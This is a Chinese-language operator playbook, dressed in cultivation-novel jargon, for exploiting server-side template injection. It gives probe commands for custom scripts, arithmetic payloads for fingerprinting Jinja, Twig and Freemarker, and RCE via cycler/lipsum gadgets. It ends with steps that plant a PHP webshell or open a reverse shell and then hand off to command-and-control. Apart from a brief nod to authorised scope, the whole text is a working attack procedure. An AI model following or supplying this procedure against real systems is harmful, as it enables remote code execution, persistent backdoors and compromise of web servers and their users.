# 大爱仙尊 SSTI 作业手法

> 杀招：`全力以赴`  
> 工具：`python3 炼蛊房/tpl_inject_probe.py ssti`  
> 广谱：`core_web_surface_probe.py`（只探算术，不发 gadget）  
> 专卡：Jeecg JMReport 走 `济世·无门.md`

目标须在 scope。探测用 `1337*7=9359`，**不用 49**（页面里到处都是 49）。

---

## 1. 立刻跑

```bash
python3 炼蛊房/tpl_inject_probe.py --self-test
python3 炼蛊房/tpl_inject_probe.py ssti --url 'https://授权/?name=x' --param name --case <案>
# L2 成立后授权内直接 RCE
python3 炼蛊房/tpl_inject_probe.py ssti --url 'https://授权/?name=x' --param name --exec --case <案>
```

产物：`案卷/tpl_inject/ssti.json`。

---

## 2. 四刀

1. **算术过闸** — `{{1337*7}}` 出 9359，对照 `*8` 出 10696；两发都 9359 是页面常量  
2. **认族** — `{{7*'7'}}`：Twig=`7777777`，Jinja=`49`。Freemarker 走 `${}`，ERB 走 `<%=`  
3. **RCE** — `rce_forge.py shoot --family ssti-jinja|ssti-twig|ssti-freemarker`（cycler/lipsum，不赌 subclasses 下标）  
4. **落地** — `uid=` 才算 L3。`--write-ops` 落 `se_ops.php`，或 `--rev` 回 `se_listen.py`

盲 SSTI：时间或 OOB，禁止只贴百科 gadget 结案。

---

## 3. 档位

| 档 | 成立 |
|----|------|
| L1 | 模板语法被吃掉（花括号消失） |
| L2 | 9359 / 10696 差分成立 |
| L3 | `--exec` 回 `uid=` |

L3 后交接写马 / `host-c2-verify`。沙箱挡了 cycler 就换 lipsum，再换引擎专卡。
